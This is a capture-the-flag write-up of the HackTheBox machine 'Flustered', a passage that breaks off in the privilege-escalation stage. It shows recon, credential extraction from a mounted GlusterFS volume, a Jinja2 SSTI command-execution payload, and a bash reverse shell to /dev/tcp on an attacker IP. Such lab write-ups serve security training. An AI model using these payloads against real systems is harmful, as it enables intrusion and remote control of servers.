---
title: HTB: Flustered
url: https://0xdf.gitlab.io/2022/02/09/htb-flustered.html
date: 2022-02-09T10:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-flustered, hackthebox, ctf, uni-ctf, nmap, feroxbuster, wfuzz, vhosts, squid, glusterfs, mysql, foxyproxy, ssti, flask, docker, container, azure-storage, azure-storage-explorer, youtube
---

![Flustered](https://0xdfimages.gitlab.io/img/flustered-cover.png)

Fluster starts out with a coming soon webpage and a squid proxy. When both turn out as dead ends, I’ll identify GlusterFS, with a volume I can mount without auth. This volume has the MySQL data stores, and from it I’ll find Squid credentials. With access to the proxy, I’ll find the application source code, and exploit a server-side template injection vulnerability to get execution. With a foothold, I’ll find the keys necessary to get access to a second Gluster volume, which gives access as user. To root, I’ll connect to a Docker container hosting an emulated Azure Storage, and using a key from the host, pull the root SSH key. In Beyond root, an exploration into Squid and NGINX configs, and a look at full recreating the database based on the files from the remote volume.

## Box Info

| Name | [Flustered](https://hackthebox.com/machines/flustered)  [Flustered](https://hackthebox.com/machines/flustered) [Play on HackTheBox](https://hackthebox.com/machines/flustered) |
| --- | --- |
| Release Date | [31 Jan 2022](https://twitter.com/hackthebox_eu/status/1488228856645439491) |
| Retire Date | 31 Jan 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [polarbearer polarbearer](https://app.hackthebox.com/users/159204) |

## Recon

### nmap

`nmap` found seven open TCP ports, including SSH (22), HTTP (80), squid (3128), three RPC-related ports (111, 24007, and 49153), and something on 49152 that could be RPC related, but also looks HTTP-ish:

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.131
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-05 07:01 EST
Nmap scan report for 10.10.11.131
Host is up (0.034s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
3128/tcp  open  squid-http
24007/tcp open  unknown
49152/tcp open  unknown
49153/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 25.57 seconds
oxdf@hacky$ nmap -p 22,80,111,3128,24007,49152,49153 -sCV -oA scans/nmap-tcpscripts 10.10.11.131
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-05 10:50 EST
Nmap scan report for 10.10.11.131
Host is up (0.026s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:31:fc:38:ff:2f:a7:fd:89:a3:48:bf:ed:6b:97:cb (RSA)
|   256 e5:f8:27:4c:38:40:59:e0:56:e7:39:98:6b:86:d7:3a (ECDSA)
|_  256 62:6d:ab:81:fc:d2:f7:a1:c1:9d:39:cc:f2:7a:a1:6a (ED25519)
80/tcp    open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: steampunk-era.htb - Coming Soon
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
3128/tcp  open  http-proxy  Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
24007/tcp open  rpcbind
49152/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=flustered.htb
| Not valid before: 2021-11-25T15:27:31
|_Not valid after:  2089-12-13T15:27:31
|_ssl-date: TLS randomness does not represent time
49153/tcp open  rpcbind
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.39 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version, the host is likely running Debian 10 buster.

There’s a TLS certificate on 49152 that shows a common name of `flustered.htb`. Taking a quick manual look at the certificate in Firefox didn’t show anything else interesting. Trying to visit that port in Firefox returned an error as well.

### Website - TCP 80

#### Site

The site is just a background image with the title “steampunk-era.htb - Coming Soon”:

![image-20220205112814182](https://0xdfimages.gitlab.io/img/image-20220205112814182.png)

Visiting using the domain `flustered.htb` or `steampunk-era.htb` returns the same thing.

#### Tech Stack

The page source is about as simple as it can get:

```

    <html>
    <head>
    <title>steampunk-era.htb - Coming Soon</title>
    </head>
    <body style="background-image: url('/static/steampunk-3006650_1280.webp');background-size: 100%;background-repeat: no-repeat;"> 
    </body>
    </html>

```

Both `/index.html` and `/index.php` returned 404 errors, so it’s not clear what kind of site this is (but lean towards some Python or Ruby framework).

#### Directory Brute Force

I’ll run `feroxbuster` against the site and found nothing:

```

oxdf@hacky$ feroxbuster -u http://flustered.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://flustered.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
[####################] - 26s    29999/29999   0s      found:0       errors:0      
[####################] - 26s    29999/29999   1141/s  http://flustered.htb

```

### Subdomains

Given the use of the two domains, I’ll fuzz for subdomains on both in the background, but come up empty:

```

oxdf@hacky$ wfuzz -u http://10.10.11.131 -H "Host: FUZZ.flustered.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 245
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.131/
Total requests: 100000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

Total time: 299.6520
Processed Requests: 100000
Filtered Requests: 100000
Requests/sec.: 333.7204

oxdf@hacky$ wfuzz -u http://10.10.11.131 -H "Host: FUZZ.steampunk-era.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 245
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.131/
Total requests: 100000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

Total time: 299.7374
Processed Requests: 100000
Filtered Requests: 100000
Requests/sec.: 333.6253

```

### Squid - 3128

Squid is a proxy that might allow for other access. Unfortunately, no matter what I try to access through it, it returns a page saying I’m unauthorized. For example, here I’m trying to go through the squid proxy and back to myself to see if I can get a connection:

```

oxdf@hacky$ curl --proxy http://10.10.11.131:3128 http://10.10.14.6/test.html
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>                                                                                                                            
<meta type="copyright" content="Copyright (C) 1996-2018 The Squid Software Foundation and contributors">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>ERROR: Cache Access Denied</title>
<style type="text/css"><!--
...[snip]...
<div id="content">
<p>The following error was encountered while trying to retrieve the URL: <a href="http://10.10.14.6/">http://10.10.14.6/</a></p>

<blockquote id="error">
<p><b>Cache Access Denied.</b></p>
</blockquote>

<p>Sorry, you are not currently allowed to request http://10.10.14.6/ from this cache until you have authenticated yourself.</p>

<p>Please contact the <a href="mailto:webmaster?subject=CacheErrorInfo%20-%20ERR_CACHE_ACCESS_DENIED&amp;body=CacheHost%3A%20flustered%0D%0AErrPage%3A%20ERR_CACHE_ACCESS_DENIED%0D%0AErr%3A%20%5Bnone%5D%0D%0ATimeStamp%3A%20Sat,%2005%20Feb%202022%2020%3A12%3A12%20GMT%0D%0A%0D%0AClientIP%3A%2010.10.14.6%0D%0A%0D%0AHTTP%20Request%3A%0D%0AGET%20%2F%20HTTP%2F1.1%0AUser-Agent%3A%20curl%2F7.68.0%0D%0AAccept%3A%20*%2F*%0D%0AProxy-Connection%3A%20Keep-Alive%0D%0AHost%3A%2010.10.14.6%0D%0A%0D%0A%0D%0A">cache administrator</a> if you have difficulties authenticating yourself.</p>

<br>
</div>

<hr> 
<div id="footer">
<p>Generated Sat, 05 Feb 2022 20:12:12 GMT by flustered (squid/4.6)</p>
<!-- ERR_CACHE_ACCESS_DENIED -->
</div>
</body></html>

```

I also tried visiting `http://localhost`, `http://127.0.0.1`, and a few other things like that, but all returned unauthorized. I’ll have to check back if I can find creds.

### GlusterFS - TCP 111/24007/49152/49153

#### Identification

Some Goolging for these port numbers will turn up [this document](https://docs.gluster.org/en/release-3.7.0-1/Troubleshooting/troubleshootingFAQ/) from the GlusterFS documentation, including:

> Preferably, your storage environment should be located on a safe segment of your network where firewall is not necessary. In the real world, that simply isn’t possible for all environments. If you are willing to accept the potential performance loss of running a firewall, you need to know that Gluster makes use of the following ports:
>
> - 24007 TCP for the Gluster Daemon
> - 24008 TCP for Infiniband management (optional unless you are using IB)
> - One TCP port for each brick in a volume. So, for example, if you have 4 bricks in a volume, port 24009 – 24012 would be used in GlusterFS 3.3 & below, 49152 - 49155 from GlusterFS 3.4 & later.
> - 38465, 38466 and 38467 TCP for the inline Gluster NFS server.
> - Additionally, port 111 TCP and UDP (since always) and port 2049 TCP-only (from GlusterFS 3.4 & later) are used for port mapper and should be open.

These ports line up almost exactly with what `nmap` showed.

That says that 49152 and 49153 are for each for bricks in the volume, which implies this is GlusterFS 3.4+, and there are at least two bricks.

#### Enumerate Volumes

`sudo apt install glusterfs-server` installs the `gluster` command, which is useful for [enumerating the GlusterFS server](https://lists.gluster.org/pipermail/gluster-devel/2012-November/025635.html). For some reason I had to run it as root to get it to not throw a bunch of errors:

```

oxdf@hacky$ sudo gluster --remote-host=10.10.11.131 volume list
vol1
vol2

```

As guessed by the ports, there are two volumes.

#### Mount Fails

I’ll try to mount one, but either will fail:

```

oxdf@hacky$ sudo mount -t glusterfs 10.10.11.131:/vol1 /mnt
Mount failed. Check the log file  for more details.

```

There is a log file in `/var/log/glusterfs`:

```

oxdf@hacky$ cat /var/log/glusterfs/
cli.log  mnt.log
oxdf@hacky$ sudo cat /var/log/glusterfs/mnt.log                                                     
[2022-02-07 08:40:34.270986] I [MSGID: 100030] [glusterfsd.c:2865:main] 0-/usr/sbin/glusterfs: Started running /usr/sbin/glusterfs version 7.2 (args: /usr/sbin/glusterfs --process-name fuse --volfile-server=10.10.11.131 --volfile-id=/vol1 /mnt) 
[2022-02-07 08:40:34.271806] I [glusterfsd.c:2593:daemonize] 0-glusterfs: Pid of current running process is 142297
[2022-02-07 08:40:34.273588] I [MSGID: 101190] [event-epoll.c:679:event_dispatch_epoll_worker] 0-epoll: Started thread with index 0 
[2022-02-07 08:40:34.273618] I [MSGID: 101190] [event-epoll.c:679:event_dispatch_epoll_worker] 0-epoll: Started thread with index 1 
[2022-02-07 08:40:34.330674] I [socket.c:4337:ssl_setup_connection_params] 0-vol1-client-0: SSL support on the I/O path is ENABLED
[2022-02-07 08:40:34.330838] I [socket.c:4394:ssl_setup_connection_params] 0-vol1-client-0: failed to open /etc/ssl/dhparam.pem, DH ciphers are disabled
[2022-02-07 08:40:34.331018] E [socket.c:4461:ssl_setup_connection_params] 0-vol1-client-0: could not load our cert at /etc/ssl/glusterfs.pem
[2022-02-07 08:40:34.331033] E [socket.c:241:ssl_dump_error_stack] 0-vol1-client-0:   error:02001002:system library:fopen:No such file or directory
[2022-02-07 08:40:34.331042] E [socket.c:241:ssl_dump_error_stack] 0-vol1-client-0:   error:20074002:BIO routines:file_ctrl:system lib
[2022-02-07 08:40:34.331055] E [socket.c:241:ssl_dump_error_stack] 0-vol1-client-0:   error:140DC002:SSL routines:use_certificate_chain_file:system lib
[2022-02-07 08:40:34.331143] I [MSGID: 114020] [client.c:2434:notify] 0-vol1-client-0: parent translators are ready, attempting connect on transport 
[2022-02-07 08:40:34.331878] E [MSGID: 101075] [common-utils.c:503:gf_resolve_ip6] 0-resolver: getaddrinfo failed (family:2) (Temporary failure in name resolution) 
[2022-02-07 08:40:34.331905] E [name.c:265:af_inet_client_get_remote_sockaddr] 0-vol1-client-0: DNS resolution failed on host flustered
Final graph:    
+------------------------------------------------------------------------------+
  1: volume vol1-client-0     
  2:     type protocol/client
...[snip]...

```

The last line before “Final graph” says “DNS resolution failed on host flustered”.

#### Mount vol1 Fails Again

I’ll add `flustered` to my `hosts` file:

```
10.10.11.131 flustered.htb steampunk-era.htb flustered

```

`vol1` still doesn’t mount:

```

oxdf@hacky$ sudo mount -t glusterfs 10.10.11.131:/vol1 /mnt
Mount failed. Check the log file  for more details.

```

Looking just before the “Final graph” again, this time there are SSL errors:

```

...[snip]...
[2022-02-07 11:29:13.529110] I [MSGID: 101190] [event-epoll.c:679:event_dispatch_epoll_worker] 0-epoll: Started thread with index 0
[2022-02-07 11:29:13.529139] I [MSGID: 101190] [event-epoll.c:679:event_dispatch_epoll_worker] 0-epoll: Started thread with index 1
[2022-02-07 11:29:13.586276] I [socket.c:4337:ssl_setup_connection_params] 0-vol1-client-0: SSL support on the I/O path is ENABLED
[2022-02-07 11:29:13.586480] I [socket.c:4394:ssl_setup_connection_params] 0-vol1-client-0: failed to open /etc/ssl/dhparam.pem, DH ciphers are disabled
[2022-02-07 11:29:13.586643] E [socket.c:4461:ssl_setup_connection_params] 0-vol1-client-0: could not load our cert at /etc/ssl/glusterfs.pem
[2022-02-07 11:29:13.586658] E [socket.c:241:ssl_dump_error_stack] 0-vol1-client-0:   error:02001002:system library:fopen:No such file or directory
[2022-02-07 11:29:13.586669] E [socket.c:241:ssl_dump_error_stack] 0-vol1-client-0:   error:20074002:BIO routines:file_ctrl:system lib
[2022-02-07 11:29:13.586678] E [socket.c:241:ssl_dump_error_stack] 0-vol1-client-0:   error:140DC002:SSL routines:use_certificate_chain_file:system lib
[2022-02-07 11:29:13.586771] I [MSGID: 114020] [client.c:2434:notify] 0-vol1-client-0: parent translators are ready, attempting connect on transport
...[snip]...

```

It’s failing to load `/etc/ssl/glusterfs.pem` and `/etc/ssl/dhparam.pem`. Interestingly, these errors were actually in the original log as well.

#### Mount vol2

Once I’ve updated the `hosts` file, `vol2` mounts without issue:

```

oxdf@hacky$ sudo mount -t glusterfs 10.10.11.131:/vol2 /mnt
oxdf@hacky$ sudo ls /mnt/
aria_log.00000001  aria_log_control  debian-10.3.flag  ib_buffer_pool  ibdata1  ib_logfile0  ib_logfile1  ibtmp1  multi-master.info  mysql  mysql_upgrade_info  performance_schema  squid  tc.log

```

#### Enumeration

Some Googling of the file names in that directly suggest that this is the `/var/lib/mysql` directory, which is where MariaDB (MySQL) stores it’s data. This directory actually has everything I need to recreate the database locally, and I’ll show how to do that in [Beyond Root](#recreate-mysql-db).

What immediately jumps out as interesting is the `squid` directory:

```

oxdf@hacky$ sudo ls -l /mnt/squid
total 99
-rw-rw---- 1 avahi-autoipd ssl-cert    67 Oct 25 08:43 db.opt
-rw-rw---- 1 avahi-autoipd ssl-cert  1775 Oct 25 08:44 passwd.frm
-rw-rw---- 1 avahi-autoipd ssl-cert 98304 Oct 25 08:44 passwd.ibd

```

The `passwd.ibd` file has what looks like a username amd a name:

```

oxdf@hacky$ 
oxdf@hacky$ sudo cat /mnt/squid/passwd.ibd
       @!&&     GxNGxNwiiwm%E2infimum
lance.friedmano>WJ5-jD<5^m3Lance Friedmanpcm%

```

If “Lance Friedman” is the name, and “lance.friedman” is the username, the string in the middle is “o>WJ5-jD<5^m3”, and there’s another string, “infimum”. It’s even more clear in `xxd` (with `grep -vF` to remove the lines of completely unprintable characters):

```

oxdf@hacky$ sudo xxd /mnt/squid/passwd.ibd | grep -vF "................"
00000030: 0006 0000 0040 0000 0021 0000 0004 0000  .....@...!......
00000080: ffff ffff 0000 0000 0001 0000 0002 0026  ...............&
00000090: 0000 0002 0026 0000 0000 0000 0000 ffff  .....&..........
00004000: 47d2 78df 0000 0001 0000 0000 0000 0000  G.x.............
00004010: 0000 0000 0018 ca4e 0005 0000 0000 0000  .......N........
00007ff0: 0000 0000 0000 0000 47d2 78df 0018 ca4e  ........G.x....N
00008000: 771e baac 0000 0002 0000 0000 0000 0000  w...............
00008070: 69d2 0000 0003 ffff ffff ffff ffff ffff  i...............
00008130: 69d2 ffff ffff ffff ffff ffff ffff ffff  i...............
0000bff0: 0000 0000 0000 0000 771e baac 0018 d2d7  ........w.......
0000c000: af6d 0625 0000 0003 ffff ffff ffff ffff  .m.%............
0000c010: 0000 0000 0018 e3cd 45bf 0000 0000 0000  ........E.......
0000c050: 0002 00f2 0000 0005 0000 0002 0032 0100  .............2..
0000c060: 0200 1f69 6e66 696d 756d 0002 000b 0000  ...infimum......
0000c070: 7375 7072 656d 756d 000e 0d0e 0000 0010  supremum........
0000c080: ffee 6c61 6e63 652e 6672 6965 646d 616e  ..lance.friedman
0000c090: 0000 0000 0000 8000 0000 0000 006f 3e57  .............o>W
0000c0a0: 4a35 2d6a 443c 355e 6d33 814c 616e 6365  J5-jD<5^m3.Lance
0000c0b0: 2046 7269 6564 6d61 6e00 0000 0000 0000   Friedman.......
0000fff0: 0000 0000 0070 0063 af6d 0625 0018 e3cd  .....p.c.m.%....

```

Or with `strings`:

```

oxdf@hacky$ sudo strings /mnt/squid/passwd.ibd
infimum
supremum
lance.friedman
o>WJ5-jD<5^m3
Lance Friedman

```

### Recon Via Squid

#### Auth

Trying the different potential passwords from above, “infimum” and “supremum” both return the same invalid Squid page as previously seen. The other one does not:

```

oxdf@hacky$ echo "It worked!" > test.html
oxdf@hacky$ curl --proxy 'http://lance.friedman:o>WJ5-jD<5^m3@10.10.11.131:3128' http://10.10.14.6/test.html
It worked!

```

At the Python webserver it’s clear that the request is coming from Flustered:

```
10.10.11.131 - - [07/Feb/2022 05:30:37] "GET /test.html HTTP/1.1" 200 -

```

This shows that those creds work to auth through the proxy, as now I’m able to have the proxy request a webpage from my host.

I’ll add this as a proxy in FoxyProxy:

![image-20220207152937102](https://0xdfimages.gitlab.io/img/image-20220207152937102.png)

#### HTTP

Thought the proxy, 127.0.0.1 returns the NGINX default page, which is different than the external IP:

![image-20220208062903158](https://0xdfimages.gitlab.io/img/image-20220208062903158.png)

This indicates that there’s likely some virtual host routing going on, and 127.0.0.1 is different.

`localhost` returns an error:

![image-20220207153123553](https://0xdfimages.gitlab.io/img/image-20220207153123553.png)

This isn’t important at all, but I’ll look at this in [BeyondRoot](#squid-localhost).

#### Directory Brute Force

Of course now I have a new virtual host to explore, so I’ll brute force with `feroxbuster`:

```

oxdf@hacky$ feroxbuster -u http://127.0.0.1 -p 'http://lance.friedman:o>WJ5-jD<5^m3@10.10.11.131:3128'

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://127.0.0.1
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💎  Proxy                 │ http://lance.friedman:o>WJ5-jD<5^m3@10.10.11.131:3128
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       12w      185c http://127.0.0.1/app => http://127.0.0.1/app/
301      GET        7l       12w      185c http://127.0.0.1/app/templates => http://127.0.0.1/app/templates/
301      GET        7l       12w      185c http://127.0.0.1/app/config => http://127.0.0.1/app/config/
301      GET        7l       12w      185c http://127.0.0.1/app/static => http://127.0.0.1/app/static/
[####################] - 47s   149995/149995  0s      found:4       errors:1      
[####################] - 47s    29999/29999   638/s   http://127.0.0.1 
[####################] - 46s    29999/29999   643/s   http://127.0.0.1/app 
[####################] - 46s    29999/29999   639/s   http://127.0.0.1/app/templates 
[####################] - 46s    29999/29999   641/s   http://127.0.0.1/app/config 
[####################] - 46s    29999/29999   642/s   http://127.0.0.1/app/static

```

There’s an `app` directory, with `templates`, `config`, and `static`. This structure feels a lot like what you see with Python or Ruby frameworks, or maybe even Node. I’ll run again on the `app` directory, looking for those kinds of files, as well as `html`, as that’s what I expect in the `templates` directory:

```

oxdf@hacky$ feroxbuster -u http://127.0.0.1/app -x py,js,rb,html -p 'http://lance.friedman:o>WJ5-jD<5^m3@10.10.11.131:3128'

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://127.0.0.1/app
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💎  Proxy                 │ http://lance.friedman:o>WJ5-jD<5^m3@10.10.11.131:3128
 💲  Extensions            │ [py, js, rb, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       12w      185c http://127.0.0.1/app/templates => http://127.0.0.1/app/templates/
301      GET        7l       12w      185c http://127.0.0.1/app/config => http://127.0.0.1/app/config/
200      GET       27l       71w      748c http://127.0.0.1/app/app.py
301      GET        7l       12w      185c http://127.0.0.1/app/static => http://127.0.0.1/app/static/
[####################] - 3m    599980/599980  0s      found:4       errors:1      
[####################] - 3m    149995/149995  718/s   http://127.0.0.1/app 
[####################] - 3m    149995/149995  717/s   http://127.0.0.1/app/templates 
[####################] - 3m    149995/149995  718/s   http://127.0.0.1/app/config 
[####################] - 3m    149995/149995  719/s   http://127.0.0.1/app/static

```

Very quickly it finds `app.py`, and returning 200, which means I can probably grab it. I’ll do so with `wget`:

```

oxdf@hacky$ http_proxy='http://lance.friedman:o>WJ5-jD<5^m3@10.10.11.131:3128' wget http://127.0.0.1/app/app.py
--2022-02-07 05:50:57--  http://127.0.0.1/app/app.py
Connecting to 10.10.11.131:3128... connected.
Proxy request sent, awaiting response... 200 OK
Length: 748 [application/octet-stream]
Saving to: ‘app.py’

app.py                          100%[====================================================>]     748  --.-KB/s    in 0s      

2022-02-07 05:50:57 (71.7 MB/s) - ‘app.py’ saved [748/748]

```

## Shell as www-data

### Code Analysis

The source shows a Python Flask application, that actually looks like it’s the source for the main site:

```

from flask import Flask, render_template_string, url_for, json, request
app = Flask(__name__)

def getsiteurl(config):
  if config and "siteurl" in config:
    return config["siteurl"]
  else:
    return "steampunk-era.htb"

@app.route("/", methods=['GET', 'POST'])
def index_page():
  # Will replace this with a proper file when the site is ready
  config = request.json

  template = f'''
    <html>
    <head>
    <title>{getsiteurl(config)} - Coming Soon</title>
    </head>
    <body style="background-image: url('{url_for('static', filename='steampunk-3006650_1280.webp')}');background-size: 100%;background-repeat: no-repeat;"> 
    </body>
    </html>
  '''
  return render_template_string(template)

if __name__ == "__main__":
  app.run()

```

There’s only one route, accepting either GET or POST requests on `/`, which called `index_page()`.

It sets `config` to be whatever JSON parameters are passed in the POST body. Then it defines a template, and returns `render_template_string(template)`.

Within the template, there is a call to `getsiteurl`, passing in `config`, to set the HTML title of the page. This function just looks for the key `siteurl` in the config, and returns that value, or `steampunk-era.htb` if it’s not found or there is no config.

I can test that this is the main site by sending a JSON payload to try to change the site title. I’ll drop into a Python shell:

```

>>> import requests
>>> resp = requests.post('http://10.10.11.131/', json={"siteurl": "0xdf.htb"})
>>> print(resp.text)

    <html>
    <head>
    <title>0xdf.htb - Coming Soon</title>
    </head>
    <body style="background-image: url('/static/steampunk-3006650_1280.webp');background-size: 100%;background-repeat: no-repeat;"> 
    </body>
    </html>

```

It worked. I passed in “0xdf.htb”, and that now shows up in the title.

### SSTI

#### Test

Because user-controller data is being passed into a rendered template, this is likely going to be vulnerable to serverside template injection (SSTI).

The standard check for this is a payload like `{{7*7}}`. I’ll try that:

```

>>> resp = requests.post('http://10.10.11.131/', json={"siteurl": "{{7*7}}"})
>>> print(resp.text)

    <html>
    <head>
    <title>49 - Coming Soon</title>
    </head>
    <body style="background-image: url('/static/steampunk-3006650_1280.webp');background-size: 100%;background-repeat: no-repeat;"> 
    </body>
    </html>

```

The server saw `{{7*7}}` and interpreted the `7*7` as code it should evaluate, and returned 49.

#### POC

A more interesting POC would to try to run system commands. HackTricks has a nice page on SSTI, and in the [Jinja2 section](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python) has this example to execute commands:

```

{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}

```

I’ll modify it slightly to try to run the `id` command:

```

>>> payload = '''{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}'''

```

This is finding a way to locate the `import` command and then get the `os` module without having access to just call `import`, which isn’t possible in SSTI.

It works:

```

>>> resp = requests.post('http://10.10.11.131/', json={"siteurl": payload})
>>> print(resp.text)

    <html>
    <head>
    <title>uid=33(www-data) gid=33(www-data) groups=33(www-data)
 - Coming Soon</title>
    </head>
    <body style="background-image: url('/static/steampunk-3006650_1280.webp');background-size: 100%;background-repeat: no-repeat;"> 
    </body>
    </html>

```

#### Shell

I’ll modify that again to get a reverse shell, and (with `nc` listening on 443) send it:

```

>>> payload = '''{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"').read()}}{%endif%}{%endfor%}'''
>>> resp = requests.post('http://10.10.11.131/', json={"siteurl": payload}); print(resp.text)

```

It just hangs for a minute or so (before returning a 504), but at `nc`, there’s a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.131 53856
bash: cannot set terminal process group (632): Inappropriate ioctl for device
bash: no job control in this shell
www-data@flustered:~/html/app$

```

I’ll upgrade with the `script` trick:

```

www-data@flustered:~/html/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@flustered:~/html/app$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@flustered:~/html/app$

```

## Shell as jennifer

### Enumeration

There’s not much to find in the web directories. There’s one user with a home directory, jennifer, but www-data can’t access it:

```

www-data@flustered:/home$ ls -l
total 4
drwxr-x--- 5 jennifer jennifer 4096 Oct 25 06:49 jennifer

```

www-data can read files in `/etc/ssl` (which isn’t the default config):

```

www-data@flustered:/etc/ssl$ ls -l
total 44
drwxr-xr-x 2 root root 16384 Jan 28 10:00 certs
-rw-r--r-- 1 root root  4060 Nov 25 15:42 glusterfs.ca
-rw-r--r-- 1 root root  3243 Nov 25 15:24 glusterfs.key
-rw-r--r-- 1 root root  1822 Nov 25 15:27 glusterfs.pem
-rw-r--r-- 1 root root 11118 Aug 24 09:30 openssl.cnf
drwx------ 2 root root  4096 Jan 28 10:00 private

```

`glusterfs.pem` was one of the files that wasn’t present when trying to mount `vol1`.

### Mount vol1

I’ll copy `glusterfs.pem` into my local `/etc/ssl` directory, and try the mount again. It still returns errors, this time looking for `glusterfs.key`:

```

[2022-02-07 11:41:20.584384] E [socket.c:4469:ssl_setup_connection_params] 0-vol1-client-0: could not load private key at /etc/ssl/glusterfs.key
[2022-02-07 11:41:20.584406] E [socket.c:241:ssl_dump_error_stack] 0-vol1-client-0:   error:02001002:system library:fopen:No such file or directory
[2022-02-07 11:41:20.584415] E [socket.c:241:ssl_dump_error_stack] 0-vol1-client-0:   error:20074002:BIO routines:file_ctrl:system lib
[2022-02-07 11:41:20.584423] E [socket.c:241:ssl_dump_error_stack] 0-vol1-client-0:   error:140B0002:SSL routines:SSL_CTX_use_PrivateKey_file:system lib

```

I’ll copy `glusterfs.key` and `glusterfs.ca` into `/etc/ssl`, and it works:

```

root@hacky:/etc/ssl# mount -t glusterfs 10.10.11.131:/vol1 /mnt
root@hacky:/etc/ssl# ls /mnt
user.txt

```

I’ll grab `user.txt`:

```

root@hacky:/mnt# cat user.txt
085ee121************************

```

### SSH

This is actually jennifer’s homedir:

```

root@hacky:/mnt# ls -la
total 22
drwxr-x---  5 oxdf oxdf 4096 Oct 25 01:49 .
drwxr-xr-x 21 root root 4096 Feb  7 06:40 ..
lrwxrwxrwx  1 oxdf oxdf    9 Oct 28 02:59 .bash_history -> /dev/null
-rw-r--r--  1 oxdf oxdf  220 Sep 20 08:27 .bash_logout
-rw-r--r--  1 oxdf oxdf 3526 Sep 20 08:27 .bashrc
drwx------  3 oxdf oxdf 4096 Oct 25 01:44 .gnupg
-rw-r--r--  1 oxdf oxdf  807 Sep 20 08:27 .profile
